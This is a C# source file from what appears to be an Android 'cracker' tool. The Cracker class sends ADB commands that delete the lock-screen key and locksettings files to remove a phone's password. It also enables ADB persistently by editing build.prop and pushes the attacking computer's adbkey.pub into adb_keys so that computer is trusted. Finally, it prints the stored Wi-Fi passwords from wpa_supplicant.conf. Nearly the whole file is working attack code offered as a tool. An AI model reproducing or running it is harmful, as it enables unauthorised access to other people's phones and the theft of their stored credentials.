using SMPHCracker.Model;
using SMPHCracker.Model.Dictionarys;
using SMPHCracker.Model.Enums;
using System;
using System.Collections.Generic;
using System.Linq;


namespace SMPHCracker.Logic
{
    class Cracker : ICracker
    {
        private Dictionary<ADBCommands, String> adbDictionary = new ADBDictionary().GetDictionary();
        private Dictionary<String, StatusEnum> statusDictionary = new StatusDictionary().GetStatusDictionary();

        public StatusEnum GetStatus()
        {
            StatusEnum status;

            String output = Execute(ADBCommands.DEVICES);

            statusDictionary.TryGetValue(statusDictionary.Keys.FirstOrDefault(k => output.Contains($"{k}\r")) ?? "nodevice", out status);

            return status != StatusEnum.ADB ? status : (output = Execute(ADBCommands.SHELLROOT)).Contains("denied") || output.Contains("error") ? StatusEnum.ADB : StatusEnum.Root;       
   
        }

        public string Execute(ADBCommands command, params string[] str)
        {
            /**
             * Prüfen des Commands
             * Einfügen der Zeichenfolge an den Anfang
             **/
            if (command == ADBCommands.SHELLROOT || command == ADBCommands.SETPROP)
                str = (str ?? Enumerable.Empty<string>()).Concat(Enumerable.Repeat("'\"", 1)).ToArray();

            return ADB.ExecuteCommand(String.Join(" ", adbDictionary[command], String.Join(" ", str)));
        }


        public string GetBezeichnung()
        {
            return $"{Execute(ADBCommands.GETPROP, "ro.product.brand")} {Execute(ADBCommands.GETPROP, "ro.product.model")}";
        }

        public bool RemovePassoword(StatusEnum status)
        {
            switch (status)
            {
                case StatusEnum.Root:
                    //Check if .key file exists
                    if (!(Execute(ADBCommands.SHELLROOT, "ls /data/system/*.key > /dev/null 2>&1 && echo 'true' || echo 'false'").Contains("true")))
                        return false;

                     Execute(ADBCommands.SHELLROOT, "mount data");
                    //Remove LockScreen
                    Execute(ADBCommands.SHELLROOT, "rm /data/system/*.key");
                    //Reset LockSettings (optional -> prevent crash in Phone-Settings)
                    Execute(ADBCommands.SHELLROOT, "rm /data/system/locksettings*");

                    //Check if .key file not exists
                    if (Execute(ADBCommands.SHELLROOT, "ls /data/system/*.key > /dev/null 2>&1 && echo 'true' || echo 'false'").Contains("false"))
                        return true;
                    else
                        return false;

                case StatusEnum.Recovery:
                    //Check if .key file exists
                    if (!(Execute(ADBCommands.SHELL, "ls /data/system/*.key > /dev/null 2>&1 && echo 'true' || echo 'false'").Contains("true")))
                        return false;

                    Execute(ADBCommands.SHELL, "mount data");
                    //Remove LockScreen
                    Execute(ADBCommands.SHELL, "rm /data/system/*.key");
                    //Reset LockSettings (optional -> prevent crash in Phone-Settings)
                    Execute(ADBCommands.SHELL, "rm /data/system/locksettings*");

                    //Check if .key file not exists
                    if (Execute(ADBCommands.SHELL, "ls /data/system/*.key > /dev/null 2>&1 && echo 'true' || echo 'false'").Contains("false"))
                        return true;
                    else
                        return false;

                case StatusEnum.Sideload:
                    return RemovePasswordSideload();

                default:
                    return false;
            }
        }
        private bool RemovePasswordSideload()
        {
            return false;
        }

        public bool EnableADB(StatusEnum status)
        {
            switch (status)
            {
                case StatusEnum.Recovery:
                    //TODO - check if enabling ADB was successfully

                    //Add ADB-Settings
                    Execute(ADBCommands.SHELL, "mount data");
                    Execute(ADBCommands.SHELL, "\"echo -n 'mtp,adb' > /data/property/persist.sys.usb.config\"");
                    //Activates ADB-Settings
                    Execute(ADBCommands.SHELL, "mount system");
                    Execute(ADBCommands.SHELL, "\"echo '' >> /system/build.prop\"");
                    Execute(ADBCommands.SHELL, "\"echo '#Enable ADB with Cracker \' >> /system/build.prop\"");
                    Execute(ADBCommands.SHELL, "\"echo 'persist.service.ADB.enable=1' >> /system/build.prop\"");
                    Execute(ADBCommands.SHELL, "\"echo 'persist.service.debuggable=1' >> /system/build.prop\"");
                    Execute(ADBCommands.SHELL, "\"echo 'persist.sys.usb.config=mtp,adb' >> /system/build.prop\"");

                    return true;

                case StatusEnum.Sideload:
                    return EnableADBSideload();

                default:
                    return false;
            }
        }
        private bool EnableADBSideload()
        {
            return false;
        }

        public bool VerifyADB(StatusEnum status)
        {
            if (status == StatusEnum.Recovery)
            {
                //TODO - get adkey.pub from folder .android
                //TODO - check if vertifying PC was successfully

                //Vertify PC for ADB
                Execute(ADBCommands.PUSH, @"C:\Users\ErdnüßFrederic\.android\adbkey.pub", "/data/misc/adb/adb_keys");

                return true;
            }
            else if(status == StatusEnum.Sideload)
            {
                return VertifyADBSideload();
            }

            return false;
        }
        private bool VertifyADBSideload()
        {
            return false;
        }

        public string ShowWLANKeys(StatusEnum status)
        {
            switch (status)
            {
                case StatusEnum.Root:
                    //Show WLAN-Keys
                    return Execute(ADBCommands.SHELLROOT, "cat /data/misc/wifi/wpa_supplicant.conf");

                case StatusEnum.Recovery:
                    //Show WLAN-Keys
                    return Execute(ADBCommands.SHELL, "cat /data/misc/wifi/wpa_supplicant.conf");

                default:
                    return "No wlan keys detected!";
            }
        }
    }
}
